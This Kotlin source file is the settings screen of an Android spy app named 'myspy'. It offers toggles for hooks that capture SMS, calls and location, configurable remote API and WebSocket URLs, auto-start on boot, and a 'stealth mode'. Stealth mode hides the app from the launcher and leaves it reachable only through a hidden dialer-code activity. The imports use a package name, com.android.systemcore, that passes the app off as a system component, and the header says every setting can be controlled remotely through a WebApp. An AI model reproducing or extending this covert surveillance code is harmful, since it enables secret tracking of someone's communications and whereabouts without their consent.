package com.myspy.android.ui.settings

import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import com.android.systemcore.BuildConfig
import com.android.systemcore.databinding.FragmentSettingsBinding
import com.myspy.android.data.local.prefs.PreferencesManager
import com.myspy.android.ui.hidden.HiddenActivity
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import timber.log.Timber
import javax.inject.Inject

/**
 * Settings Fragment
 * @author Michael KOJDL
 * @version 1.0.0
 *
 * Allows viewing and editing:
 * - API and WebSocket URLs
 * - Stealth mode toggle
 * - Auto-start on boot
 * - System hooks enable/disable
 *
 * All settings can be remotely controlled via WebApp
 */
@AndroidEntryPoint
class SettingsFragment : Fragment() {

    private var _binding: FragmentSettingsBinding? = null
    private val binding get() = _binding!!

    @Inject
    lateinit var prefsManager: PreferencesManager

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentSettingsBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        loadSettings()
        setupListeners()
    }

    private fun loadSettings() {
        lifecycleScope.launch {
            try {
                // Load server URLs
                val apiUrl = prefsManager.getApiBaseUrl()
                val wssUrl = prefsManager.getWssBaseUrl()

                binding.editApiUrl.setText(apiUrl)
                binding.editWssUrl.setText(wssUrl)

                // Load app behavior
                binding.switchStealthMode.isChecked = prefsManager.isStealthModeEnabled()
                binding.switchAutoStart.isChecked = prefsManager.isAutoStartEnabled()

                // Load system hooks
                binding.switchSmsHook.isChecked = prefsManager.isSmsHookEnabled()
                binding.switchCallHook.isChecked = prefsManager.isCallHookEnabled()
                binding.switchLocationHook.isChecked = prefsManager.isLocationHookEnabled()

                updateStatus("Settings loaded")
            } catch (e: Exception) {
                Timber.e(e, "Failed to load settings")
                updateStatus("Error loading settings: ${e.message}")
            }
        }
    }

    private fun setupListeners() {
        binding.btnSaveSettings.setOnClickListener {
            saveSettings()
        }

        binding.switchStealthMode.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                showStealthModeWarning()
            }
        }
    }

    private fun saveSettings() {
        lifecycleScope.launch {
            try {
                val apiUrl = binding.editApiUrl.text.toString().trim()
                val wssUrl = binding.editWssUrl.text.toString().trim()

                if (apiUrl.isEmpty() || wssUrl.isEmpty()) {
                    Toast.makeText(requireContext(), "URLs cannot be empty", Toast.LENGTH_SHORT).show()
                    return@launch
                }

                // Save server URLs
                prefsManager.setApiBaseUrl(apiUrl)
                prefsManager.setWssBaseUrl(wssUrl)

                // Save app behavior
                val stealthModeEnabled = binding.switchStealthMode.isChecked
                prefsManager.setStealthModeEnabled(stealthModeEnabled)
                prefsManager.setAutoStartEnabled(binding.switchAutoStart.isChecked)

                // Save system hooks
                prefsManager.setSmsHookEnabled(binding.switchSmsHook.isChecked)
                prefsManager.setCallHookEnabled(binding.switchCallHook.isChecked)
                prefsManager.setLocationHookEnabled(binding.switchLocationHook.isChecked)

                // Apply stealth mode if enabled
                if (stealthModeEnabled) {
                    enableStealthMode()
                } else {
                    disableStealthMode()
                }

                updateStatus("Settings saved successfully")
                Toast.makeText(requireContext(), "Settings saved", Toast.LENGTH_SHORT).show()

                Timber.i("Settings saved - API: $apiUrl, WSS: $wssUrl, Stealth: $stealthModeEnabled")

            } catch (e: Exception) {
                Timber.e(e, "Failed to save settings")
                updateStatus("Error saving settings: ${e.message}")
                Toast.makeText(requireContext(), "Failed to save settings", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun showStealthModeWarning() {
        Toast.makeText(
            requireContext(),
            "Warning: Stealth mode will hide the app. Use dialer code to access.",
            Toast.LENGTH_LONG
        ).show()
    }

    private fun enableStealthMode() {
        try {
            val packageManager = requireContext().packageManager

            // Disable MainActivity (hide from launcher)
            packageManager.setComponentEnabledSetting(
                ComponentName(requireContext(), "com.myspy.android.ui.main.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            // Enable HiddenActivity (for dialer code access)
            packageManager.setComponentEnabledSetting(
                ComponentName(requireContext(), HiddenActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            Timber.i("Stealth mode enabled")
        } catch (e: Exception) {
            Timber.e(e, "Failed to enable stealth mode")
        }
    }

    private fun disableStealthMode() {
        try {
            val packageManager = requireContext().packageManager

            // Enable MainActivity (show in launcher)
            packageManager.setComponentEnabledSetting(
                ComponentName(requireContext(), "com.myspy.android.ui.main.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            // Disable HiddenActivity
            packageManager.setComponentEnabledSetting(
                ComponentName(requireContext(), HiddenActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            Timber.i("Stealth mode disabled")
        } catch (e: Exception) {
            Timber.e(e, "Failed to disable stealth mode")
        }
    }

    private fun updateStatus(message: String) {
        binding.textSettingsStatus.text = message
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
